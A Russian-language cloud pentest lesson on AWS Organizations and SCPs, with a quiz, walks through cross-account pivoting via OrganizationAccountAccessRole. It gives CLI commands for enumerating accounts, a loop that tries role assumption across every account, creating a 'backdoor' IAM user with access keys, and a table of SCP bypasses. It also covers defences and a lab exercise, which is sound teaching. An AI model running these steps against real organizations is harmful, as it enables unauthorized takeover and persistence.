---
id: cloud-aws-organizations
title: "AWS Organizations, SCP и мульти-аккаунт: границы и их обход"
category: cloud
parent: cloud-iam-identity
difficulty: hard
order: 1
tags: [cloud, aws, organizations, scp, multi-account, cross-account, governance]
prerequisites: [cloud-iam-basics, cloud-azure-basics]
useful_for:
  - "Пентест крупных AWS-организаций"
  - "Понимание SCP и границ доверия между аккаунтами"
  - "Планирование lateral movement между аккаунтами"
estimated_minutes: 35
summary: "Как устроены AWS Organizations, Service Control Policies и мульти-аккаунт. Где проходят границы доверия, как их читать и как искать пути между аккаунтами."
---

## Зачем этот урок

Крупные компании используют **AWS Organizations** — десятки и сотни аккаунтов под одной организацией. Права регулируются не только IAM-политиками, но и **SCP (Service Control Policies)**, которые задают **максимальную** границу возможного. Понять, что разрешено и где проходят границы между аккаунтами, — половина успеха в пентесте большой организации.

## Иерархия AWS Organizations

```
Organization (management account)
 └─ Organizational Unit (OU)
     └─ Account (member)
         └─ IAM identities
```

- **Management account** — корневой, управляет организацией, создаёт новые аккаунты. Компрометация management account = компрометация всей организации.
- **OU** — группировка аккаунтов для применения SCP.
- **Member account** — рабочий аккаунт.

## SCP: граница, а не выдача прав

Критично понимать модель:

- **IAM policy** говорит, что **разрешено** конкретной идентичности.
- **SCP** говорит, что **может быть разрешено** в аккаунте/OU вообще.

Итоговое право = **пересечение** IAM и SCP. SCP **не даёт** прав — она только ограничивает. Даже если у вас `AdministratorAccess`, SCP может запретить, например, `organizations:LeaveOrganization` или `cloudtrail:StopLogging`.

Часто встречаемые защитные SCP:

- Запрет отключения CloudTrail/GuardDuty.
- Запрет выхода из организации.
- Запрет использования не одобренных регионов.
- Запрет создания root-ключей.

Обход этих SCP — цель атакующего.

## Разведка мульти-аккаунт

```bash
# Список аккаунтов организации (нужны organizations:ListAccounts)
aws organizations list-accounts --output table

# Список OU и их структура
aws organizations list-organizational-units-for-parent \
  --parent-id <ROOT_OR_OU_ID>

# Какие SCP применены к аккаунту/OU
aws organizations list-policies-for-target --target-id <ACCOUNT_ID> --filter SERVICE_CONTROL_POLICY

# Содержимое конкретной SCP
aws organizations describe-policy --policy-id <POLICY_ID>
```

## Роль OrganizationAccountAccessRole

Когда новый аккаунт создаётся через Organizations, AWS автоматически создаёт роль **`OrganizationAccountAccessRole`** в этом аккаунте с `AdministratorAccess`, которой доверяет management account. Это классический путь lateral movement:

```bash
# Из management account (или того, кто может AssumeRole)
aws sts assume-role \
  --role-arn arn:aws:iam::<MEMBER_ACCOUNT_ID>:role/OrganizationAccountAccessRole \
  --role-session-name pivot
```

Если management account скомпрометирован, вы заходите в **любой** член организации через эту роль.

## Разобранный пример: от member к организации

Исходные данные: есть ключ в member-аккаунте с правом `sts:AssumeRole`.

1. Проверяем, кто мы и в каком аккаунте:
   ```bash
   aws sts get-caller-identity
   ```
2. Ищем роли с доверием к другим аккаунтам:
   ```bash
   aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS]]" \
     --output json | jq '.[] | {RoleName, AssumeRolePolicyDocument}'
   ```
3. Находим роль с `Principal: arn:aws:iam::<OTHER_ACCT>:root` или `OrganizationAccountAccessRole`.
4. Ассумируем её:
   ```bash
   aws sts assume-role --role-arn arn:aws:iam::<OTHER_ACCT>:role/OrganizationAccountAccessRole \
     --role-session-name pivot
   ```
5. Экспортируем временные креды и повторяем разведку:
   ```bash
   export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
   aws organizations list-accounts    # если дошли до management account
   ```
6. Из management account создаём нового IAM-пользователя в любом member-аккаунте (персистентность):
   ```bash
   aws iam create-user --user-name backdoor --profile management
   aws iam create-access-key --user-name backdoor --profile management
   ```

## Обход SCP

- **Регион-локальные ресурсы**: SCP может ограничивать регионы, но некоторые сервисы (IAM, S3, Route53, CloudFront) **глобальны** и не подчиняются региональным ограничениям.
- **`iam:CreateServiceLinkedRole`**: создание служебных ролей иногда обходит явные запреты на `iam:*`.
- **Смена ролей через ресурсы**: если SCP запрещает создание пользователей, но разрешает `lambda:CreateFunction` + `iam:PassRole`, можно выполнить код под ролью с правами.
- **Management account**: SCP **не применяются** к management account. Компрометация management = обход всех SCP.

## Частые ошибки

- **Считать SCP «списком прав».** SCP не выдаёт права, только ограничивает.
- **Забыть, что SCP не действует на management account.** Это ключ ко всему.
- **Не искать `OrganizationAccountAccessRole`.** Самый частый путь между аккаунтами.
- **Игнорировать trust policies.** Именно `AssumeRolePolicyDocument` определяет, кто может войти в роль.
- **Не проверять глобальные сервисы.** Ограничение регионов не спасает от IAM/S3.

## SCP: синтаксис, приоритет и типовые ошибки

SCP — это JSON-политика, прикреплённая к корню, OU или аккаунту. Она НЕ выдаёт права: она только ограничивает максимум. Синтаксис такой же, как у IAM, но `Principal` не указывается, а `Resource` часто `*`. Пример запрета выхода за регион:

```json
{"Version":"2012-10-17","Statement":[{"Sid":"RegionLock","Effect":"Deny",
 "Action":"*","Resource":"*",
 "Condition":{"StringNotEquals":{"aws:RequestedRegion":["eu-central-1"]}}}]}
```

Приоритет: чем глубже в иерархии, тем меньше прав; эффективные права = пересечение всех SCP по пути к аккаунту. Типовая ошибка администратора — написать `Allow` в SCP и ждать, что права появятся. Не появятся: SCP только режет. Другая ошибка — Deny, который случайно блокирует `sts:AssumeRole` в `OrganizationAccountAccessRole`, ломая управление аккаунтами.

## Инструменты для мульти-аккаунт-разведки

```bash
aws organizations list-accounts --query 'Accounts[].{Id:Id,Name:Name,Status:Status}' --output table
aws organizations list-organizational-units-for-parent --parent-id r-xxxx
aws organizations list-policies --filter SERVICE_CONTROL_POLICY
aws organizations describe-policy --policy-id p-xxxx
# перебор всех аккаунтов на доступные роли
for acct in $(aws organizations list-accounts --query 'Accounts[].Id' --output text); do
  aws sts assume-role --role-arn arn:aws:iam::$acct:role/OrganizationAccountAccessRole \
    --role-session-name s 2>/dev/null && echo "assumed $acct"
done
```

`list-accounts` требует `organizations:ListAccounts`. Даже без него `OrganizationAccountAccessRole` часто доверяет management-аккаунту — и если вы в нём, вы входите в member-аккаунты.

## Разобранный пример 2: выход из member-аккаунта

1. В member-аккаунте вы нашли роль `AdminRole`.
2. Её trust: `Principal: arn:aws:iam::<mgmt>:root`.
3. Если у вас есть доступ в management-аккаунт (или вы в нём) — встаёте на роль:
```bash
aws sts assume-role --role-arn arn:aws:iam::111122223333:role/AdminRole --role-session-name x
aws sts get-caller-identity
# arn:aws:sts::111122223333:assumed-role/AdminRole/x
```
4. Дальше — поиск других member-ролей и расширение на организацию.

## Таблица обходов SCP

| Ограничение SCP | Обход |
|-----------------|-------|
| Region lock | использовать разрешённый регион |
| Deny на сервис | другой сервис с той же функцией |
| Deny на iam:* | уже выданные роли/ключи |
| MFA-условие | украсть MFA-сессию |
| Deny на AssumeRole | resource-based политика ресурса |

## Мониторинг и защита Organizations

Включайте CloudTrail на уровне организации (organization trail) — тогда события member-аккаунтов попадают в общий лог. Настраивайте SCP по принципу «запретить всё, кроме необходимого»: блокируйте выход за регион, создание публичных ресурсов, отключение логирования. Используйте `aws organizations enable-policy-type` для включения типов политик (backup, tag). Для защиты от захвата управления — MFA на root management-аккаунта и ограничение `organizations:*`.

## Практическое задание

В тестовой организации создайте два аккаунта: management и member. В member выдайте роль `OrganizationAccountAccessRole`. Из management встаньте на неё через `sts:AssumeRole`. Затем добавьте SCP с Deny на `s3:*` в member и убедитесь, что доступ пропал. Это отрабатывает и атаку, и защиту: вы увидите, как SCP реально ограничивает права, выданные в аккаунте.

## Root-доступ и SCP на корень

Management-аккаунт имеет особые права. Если SCP не применяется к корню, member-аккаунты могут создавать ресурсы, которые вы потом используете. Проверьте `list-roots` и политики на корне. Отсутствие SCP на корне — частая ошибка: тогда аккаунты почти не ограничены.

## Квиз

```quiz
- question: "Что такое SCP в AWS Organizations?"
  options:
    - "Список разрешённых пользователей"
    - "Политика, задающая максимальную границу возможного в аккаунте/OU, но не выдающая прав"
    - "Сертификат для TLS"
    - "Тип хранилища"
  answer: 1
  explanation: "SCP ограничивает максимум; итоговое право — пересечение IAM-политики и SCP."
- question: "Какая роль автоматически создаётся в новом аккаунте Organizations и доверяет management account?"
  options:
    - "AWSServiceRoleForOrganizations"
    - "OrganizationAccountAccessRole"
    - "PowerUserAccess"
    - "AWSReservedSSO"
  answer: 1
  explanation: "OrganizationAccountAccessRole даёт AdministratorAccess и доверяет management account — классический pivot."
- question: "Почему management account критичен для атакующего?"
  options:
    - "Он самый дешёвый"
    - "SCP не применяются к management account, и он управляет всей организацией"
    - "В нём нет IAM"
    - "Он не имеет API"
  answer: 1
  explanation: "SCP не действуют на management account, и из него можно выдавать доступ в любой member-аккаунт."
- question: "Что определяет, кто может войти в IAM-роль?"
  options:
    - "SCP"
    - "Trust policy (AssumeRolePolicyDocument)"
    - "Security group"
    - "Route table"
  answer: 1
  explanation: "Trust policy роли описывает доверенных принципалов, которым разрешён AssumeRole."
- question: "Почему ограничение SCP по регионам не всегда защищает?"
  options:
    - "Все сервисы региональны"
    - "Глобальные сервисы (IAM, S3, Route53, CloudFront) не подчиняются региональным ограничениям"
    - "SCP применяется только к EC2"
    - "Регионы не важны"
  answer: 1
  explanation: "Глобальные сервисы живут вне регионов, поэтому региональные ограничения их не покрывают."
```

## Где пригодится

- **Пентест больших AWS-организаций** — карта границ доверия.
- **Red team** — lateral movement между аккаунтами.
- **IR/Blue team** — детект ассумирования ролей и создания пользователей.
- **Cloud security architect** — проектирование SCP-политик.
- **Сертификации** — AWS Security Specialty.
